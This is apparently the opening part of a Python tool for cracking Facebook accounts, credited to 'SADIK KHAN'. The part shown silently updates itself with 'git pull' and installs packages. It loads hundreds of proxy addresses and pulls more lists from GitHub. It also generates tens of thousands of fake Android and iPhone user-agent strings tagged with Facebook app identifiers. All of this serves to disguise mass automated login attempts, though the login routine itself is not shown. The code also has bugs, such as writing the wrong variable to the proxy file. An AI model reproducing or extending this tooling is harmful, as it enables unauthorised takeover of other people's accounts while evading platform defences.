#FOF - _ - FILE _-_ON_-_FIRE !¡●●
#SADIK KHAN ✌️
from os import path
import os,base64,zlib,pip,urllib,time
os.system('clear')
print(f'\r\r \033[38;5;50;1m[●] CHECKING AXY SERVER UPDATE ');time.sleep(10)
os.system('git pull')
os.system('clear')
print(f' \033[38;5;42;1m[●] UPDATE DONE\033[1;37m ');time.sleep(10)
os.system('clear')
#input(f' \033[38;5;36;1m[●] PRESS ENTER TO MENU\033[1;37m ')
#os.system(f'xdg-open https://facebook.com/groups/842909060147288/ ')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
        os.system('git pull')
except:pass
proxies = ['139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '184.178.172.18:15280', '36.91.203.231:5678', '49.156.38.126:5678', '58.34.34.186:10800', '192.111.135.18:18301', '224.213.166.123:2313', '139.144.149.248:10006', '200.71.97.1:80', '72.195.34.60:27391', '103.172.24.131:5678', '72.210.221.197:4145', '120.79.31.133:8083', '192.111.137.34:18765', '36.92.9.76:49420', '103.165.22.246:5678', '46.101.163.117:31078', '212.79.108.234:8080', '184.178.172.5:15303', '123.57.1.78:111', '205.240.77.164:4145', '181.229.38.117:5678', '177.36.185.180:5678', '192.158.15.201:50877', '198.89.91.42:5678', '103.161.68.12:1080', '85.113.7.142:5678', '103.4.145.132:1080', '68.183.182.238:57923', '201.234.24.1:4153', '184.181.217.210:4145', '72.221.196.157:35904', '167.86.92.99:30543', '89.58.45.94:43952', '45.234.100.102:1080', '98.162.25.23:4145', '138.68.109.12:29542', '91.121.163.199:63056', '103.12.246.53:4145', '36.89.85.249:5678', '159.203.30.119:16884', '176.123.218.161:18080', '66.42.224.229:41679', '46.98.191.58:5678', '190.4.49.122:35010', '47.92.248.86:5678', '181.113.17.134:43443', '138.68.109.12:63245', '105.208.44.53:5678', '170.84.83.54:5678', '74.119.147.209:4145', '125.70.227.214:10800', '103.105.40.17:4145', '203.205.29.108:5678', '104.248.158.27:25100', '186.189.66.18:4153', '177.93.77.10:4153', '50.235.92.65:32100', '98.188.47.150:4145', '184.178.172.23:4145', '199.102.107.145:4145', '50.255.17.229:32100', '119.235.50.5:4145', '139.255.193.243:7623', '167.71.218.223:26108', '109.75.42.82:3629', '37.57.56.38:5678', '45.190.141.193:1080', '190.210.127.143:65407', '72.37.216.68:4145', '209.13.96.171:39921', '72.195.34.35:27360', '112.221.131.146:5678', '178.249.218.34:5678', '50.236.148.254:31699', '184.178.172.25:15291', '201.236.203.180:4153', '182.23.49.147:4153', '85.172.66.254:1099', '15.168.62.236:33080', '93.190.138.45:41487', '197.157.254.34:4145', '185.170.233.109:47574', '192.111.139.162:4145', '186.159.3.193:45524', '189.195.176.99:5678', '192.252.209.155:14455', '203.154.232.25:4153', '36.255.184.22:5678', '199.229.254.129:4145', '213.208.146.80:5678', '178.48.68.61:4145', '143.137.116.72:1080', '218.21.78.35:4145', '142.54.231.38:4145', '139.224.56.162:9992', '147.139.164.26:7302', '36.88.62.175:7511', '139.224.56.162:999', '49.231.0.178:55860', '104.37.135.145:4145', '159.69.153.169:5566', '199.102.104.70:4145', '68.71.254.6:4145', '117.4.107.199:51796', '98.175.31.195:4145', '123.57.1.78:8888', '181.115.238.186:1080', '213.32.252.134:5678', '14.0.43.193:8449', '88.102.184.156:4153', '138.118.38.2:1080', '102.217.205.117:5678', '182.161.226.15:23658', '190.2.146.108:22690', '103.221.254.59:1088', '185.43.189.182:3629', '90.188.40.61:3629', '202.40.177.186:1088', '39.104.79.145:8088', '199.58.184.97:4145', '45.60.197.203:8148', '200.115.157.211:4145', '131.221.120.196:5678', '121.37.207.154:10000', '213.14.32.70:4153', '45.128.133.209:1080', '58.215.218.170:10800', '139.224.56.162:8082', '178.158.237.68:5678', '69.61.200.104:36181', '143.202.226.13:4145', '51.83.98.190:38593', '115.127.121.198:5678', '104.200.152.30:4145', '159.89.206.6:14601', '218.93.238.185:10800', '61.191.119.134:10800', '36.95.66.243:35010', '184.170.245.148:4145', '115.243.111.42:1088', '91.211.177.245:3629', '109.122.81.1:57553', '98.188.47.132:4145', '139.196.151.191:5001', '174.64.199.79:4145', '103.87.86.146:4153', '184.181.217.206:4145', '217.66.206.156:5678', '72.221.172.203:4145', '118.40.69.218:8899', '186.87.179.54:5678', '1.9.167.36:60489', '183.194.93.138:51080', '187.243.253.238:43015', '47.252.1.180:8999', '92.241.87.14:5678', '192.252.208.70:14282', '46.148.36.47:4153', '136.17.139.223:4915', '190.151.166.15:4153', '138.68.109.12:16386', '186.97.167.26:5678', '72.195.34.42:4145', '199.102.106.94:4145', '47.252.1.180:8499', '5.135.1.146:1981', '82.200.81.5:1080', '98.162.25.7:31653', '178.35.177.242:3629', '154.113.71.102:35010', '188.190.176.114:5678', '107.181.161.81:4145', '138.68.109.12:63428', '207.180.204.70:65432', '173.236.179.119:14694', '177.10.150.3:4145', '5.58.33.187:5678', '47.109.53.253:87', '138.68.109.12:31806', '138.68.109.12:7077', '45.137.64.33:19099', '195.219.98.27:5678', '27.70.161.22:20173', '198.23.143.4:1081', '176.119.141.236:1080', '47.109.53.253:10000', '179.40.75.1:61362', '142.54.236.97:4145', '184.178.172.26:4145', '103.254.167.130:1080', '173.212.245.45:16673', '83.168.84.86:4153', '47.245.56.108:18181', '138.68.105.248:2662', '82.79.129.241:80', '8.219.169.172:19', '45.91.93.166:34575', '102.219.33.179:1080', '197.234.58.102:32767', '98.178.72.21:10919', '8.219.169.172:8080', '112.121.152.139:3128', '103.82.11.209:4153', '8.219.169.172:3790', '103.247.23.82:1080', '8.219.169.172:20', '131.221.182.14:4153', '200.46.30.210:4153', '72.195.114.184:4145', '103.210.29.201:31433', '47.92.242.45:3128', '178.150.188.118:1099', '142.54.239.1:4145', '47.250.134.231:10080', '109.236.86.203:37879', '180.191.22.50:4153', '46.40.60.108:52088', '41.139.250.223:5678']
os.system('touch proxies.txt')
try:
    prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    
    proxies=open('proxies.txt','r').read().splitlines()

fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
gtt = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-N986N Build/ZK83T5) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]"}
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus Build/QP1A.190711.020; wv)'
        b=random.choice(['6','7','8','9','10','11','12',])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 9; Nokia C2 Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
for agent in range(10000):
        aa='Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='CPU iPhone OS 16_0 like Mac OS X'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/331.0.0.9.105;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gtt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(100,114)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android ;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(90,114)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

ugen=[]
realme = random.choice(["RMX2072","RMX2086","RMX3350"])
for Xr in range (10000):	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Build/'
	e=random.choice(["MMB29T","JZO54K","M1AJQ","KOT49H"])
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(73,112)
	h='0'
	i=random.randrange(4200,4900)
	j=random.randrange(40,150)
	k='Mobile Safari/534.36'
	l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge"])
	#l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
	m=random.randrange(1,9)
	n=random.randrange(1,9)
	o='0'
	p=random.randrange(5,20)
	uaku=(f'{a} {b}.{c}; {realme}) {d}{e}; wv) {f}{g}.{h}.{i}.{j} {k} {l}/{m}.{n}.{o}.{p}')
	ugen.append(uaku)

def uaku():
	try:
		ua=open('mix.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Niki404-Cyber/user-agnet/blob/main/mix.txt').text
		ua=open('.mix.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n') 
		ua=open('.mix.txt','r').read().splitlines()
#-------[USERAGENT API ]-----#
cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
rmx = random.choice(['RMX1603','RMX1801','RMX1805','RMX1807','RMX1809','RMX1811','RMX1821','RMX1825','RMX1827','RMX1831','RMX1833','RMX1851','RMX1901','RMX1903','RMX1911','RMX1919','RMX1921','RMX1925','RMX1931','RMX1941','RMX1945','RMX1971','RMX1991','RMX1992','RMX1993','RMX2001','RMX2002','RMX2002','RMX2002','RMX2020','RMX2020','RMX2021','RMX2025','RMX2027','RMX2027','RMX2030','RMX2032','RMX2040','RMX2040','RMX2050','RMX2051','RMX2061','RMX2063','RMX2071','RMX2072','RMX2075','RMX2076','RMX2081','RMX2083','RMX2085','RMX2086','RMX2101','RMX2103','RMX2111','RMX2111','RMX2117','RMX2121','RMX2142','RMX2144','RMX2151','RMX2155','RMX2156','RMX2161','RMX2163','RMX2170','RMX2176','RMX2180','RMX2185','RMX2189','RMX2193','RMX2195','RMX2202','RMX3031','RMX3061','RMX3063','RMX3081','RMX3085','RMX3092','RMX3171','RMX3191','RMX3193','RMX3195','RMX3197','RMX3201','RMX3231','RMX3241','RMX3242'])
